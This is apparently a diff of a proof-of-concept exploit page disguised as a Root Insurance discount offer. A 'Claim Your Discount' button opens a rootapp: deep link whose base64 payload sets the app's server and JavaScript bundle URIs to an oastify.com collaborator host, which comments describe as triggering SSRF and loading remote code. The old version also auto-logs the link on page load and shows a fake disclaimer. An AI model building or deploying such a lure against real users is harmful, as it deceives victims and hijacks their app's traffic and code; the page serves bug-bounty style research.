@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Root Insurance - Special Offer</title>
+    <title>Root Insurance - Claim Your Discount</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
@@ -23,15 +23,8 @@
             text-align: center;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #666;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
+        h1 { color: #333; margin-bottom: 10px; }
+        p { color: #666; margin-bottom: 30px; line-height: 1.6; }
         .offer {
             background: #f0f7ff;
             border: 2px solid #667eea;
@@ -39,16 +32,7 @@
             padding: 20px;
             margin-bottom: 30px;
         }
-        .offer h2 {
-            color: #667eea;
-            margin: 0;
-            font-size: 28px;
-        }
-        .offer span {
-            color: #999;
-            font-size: 14px;
-            text-decoration: line-through;
-        }
+        .offer h2 { color: #667eea; margin: 0; font-size: 28px; }
         .cta-button {
             display: inline-block;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -59,58 +43,30 @@
             font-weight: bold;
             font-size: 18px;
             transition: transform 0.2s, box-shadow 0.2s;
-            cursor: pointer;
-            border: none;
-        }
-        .cta-button:hover {
-            transform: translateY(-2px);
             box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
-        }
-        .disclaimer {
-            font-size: 12px;
-            color: #999;
-            margin-top: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🚗 Root Insurance</h1>
-        <p>Get up to <strong>50% OFF</strong> on your auto insurance quote! Limited time offer for new customers.</p>
+        <p>Get <strong>50% OFF</strong> on your auto insurance! Limited time offer.</p>
         
         <div class="offer">
             <h2>50% OFF</h2>
-            <span>$200/mo</span> → <strong>$100/mo</strong>
+            <strong>Claim Now →</strong>
         </div>
         
-        <!-- This link triggers the SSRF vulnerability -->
-        <!-- The deep link opens the Root app and injects the collaborator URL as the server URI -->
-        <a href="rootapp:eyJhbmRyb2lkU2VydmVyVVJJIjogImh0dHA6Ly9mMmkyajEzY2RsYW13ZjJ5NzI3bWFsNmg3OGR6MXRwaS5vYXN0aWZ5LmNvbSJ9" class="cta-button" id="deepLink">
-            Claim Your Discount
+        <!-- 
+        This triggers SSRF: 
+        - androidServerURI: Your collaborator URL (will receive API calls)
+        - androidBundleURI: Your collaborator URL (will load JS bundle)
+        
+        The app stores these in SharedPreferences, then uses them for ALL requests
+        -->
+        <a href="rootapp:eyJhbmRyb2lkU2VydmVyVVJJIjogImh0dHA6Ly9mMmkyajEzY2RsYW13ZjJ5NzI3bWFsNmg3OGR6MXRwaS5vYXN0aWZ5LmNvbSIsICJhbmRyb2lkQnVuZGxlVVJJIjogImh0dHA6Ly9mMmkyajEzY2RsYW13ZjJ5NzI3bWFsNmg3OGR6MXRwaS5vYXN0aWZ5LmNvbSJ9" class="cta-button">
+            Open Root App
         </a>
-        
-        <p class="disclaimer">
-            By clicking, you agree to our terms and authorize us to verify your driving record.
-        </p>
-        
-        <!-- Fallback for non-mobile users -->
-        <p style="font-size: 12px; margin-top: 20px;">
-            <a href="#" onclick="alert('Please open this link on your mobile device with Root Insurance app installed.'); return false;">
-                Having trouble? Click here
-            </a>
-        </p>
     </div>
-    <!-- Auto-trigger the deep link when page loads -->
-    <script>
-        // Some users have auto-detection, others need manual click
-        // The link is pre-loaded, user just needs to click
-        
-        // Optional: Try to auto-redirect after a short delay (works on some devices)
-        setTimeout(function() {
-            // This may or may not work depending on OS/browser
-            var link = document.getElementById('deepLink');
-            console.log('Deep link ready: rootapp:eyJhbmRyb2lkU2VydmVyVVJJIjogImh0dHA6Ly9mMmkyajEzY2RsYW13ZjJ5NzI3bWFsNmg3OGR6MXRwaS5vYXN0aWZ5LmNvbSJ9');
-        }, 1000);
-    </script>
 </body>
 </html>
